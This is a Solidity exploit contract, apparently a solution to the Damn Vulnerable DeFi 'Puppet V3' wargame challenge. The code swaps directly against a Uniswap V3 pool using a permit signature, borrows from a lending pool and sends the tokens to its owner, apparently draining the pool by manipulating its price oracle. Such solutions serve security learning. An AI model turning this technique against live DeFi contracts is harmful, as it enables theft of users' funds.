// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import { PuppetV3Pool } from "./PuppetV3Pool.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

// I created this interface because DamnVulnerableToken uses pragma 0.8
// And it's incompatible with the version =0.7.6 we're using 
interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract HackPuppetV3 is IUniswapV3SwapCallback {
    address owner;

    constructor() {
        // Save owner so we can transfer tokens at the end only to us
        owner = msg.sender;
    }

    function swap(
        address _pool,
        address _token,
        int256 amount,
        uint160 sqrt,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        // Using the permit function from ERC2612 to get the allowance needed for our transaction
        IERC20(_token).permit(
            tx.origin,
            address(this),
            uint256(amount),
            deadline,
            v,
            r,
            s
        );

        // Passing encoded arguments so we don't need to write or read storage
        bytes memory encoded = abi.encode(_token, _pool);
        // Call directly the swap method of uniswapPool contract
        IUniswapV3Pool(_pool).swap(address(this), false, amount, sqrt, encoded);
    }

    function borrowAndTransfer(address _lendingPool, uint256 borrow, IWETH _weth, IERC20 _token) public {
        // Approve the amount of weth, so the lending pool can transfer itself that weth amount
        _weth.approve(_lendingPool, _weth.balanceOf(address(this)));
        // Borrow the lending
        PuppetV3Pool(_lendingPool).borrow(borrow);
        // Transfer the whole tokens to player address
        _token.transfer(owner, _token.balanceOf(address(this)));
    }

    // This function is necesary when calling the uniswapPool directly
    // Usually is the router the one has this function and the one that calls the uniswapPool
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        // Decode token and pool address
        (address _token, address _pool) = abi.decode(data, (address, address));
        // Transfer the token we're swaping for the one we're receiving
        IERC20(_token).transfer(_pool, uint256(amount1Delta));
    }

}
